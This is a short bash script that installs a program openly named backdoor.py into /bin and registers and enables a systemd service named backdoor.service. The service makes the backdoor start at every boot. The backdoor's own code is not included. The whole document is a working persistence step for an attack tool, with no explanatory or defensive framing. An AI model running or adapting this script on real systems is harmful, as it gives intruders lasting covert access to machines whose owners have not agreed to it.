#!/usr/bin/env bash

cp -i backdoor.py /bin;
chmod 755 /bin/backdoor.py;
cp backdoor.service /lib/systemd/system/backdoor.service;
systemctl daemon-reload;
systemctl enable backdoor.service;
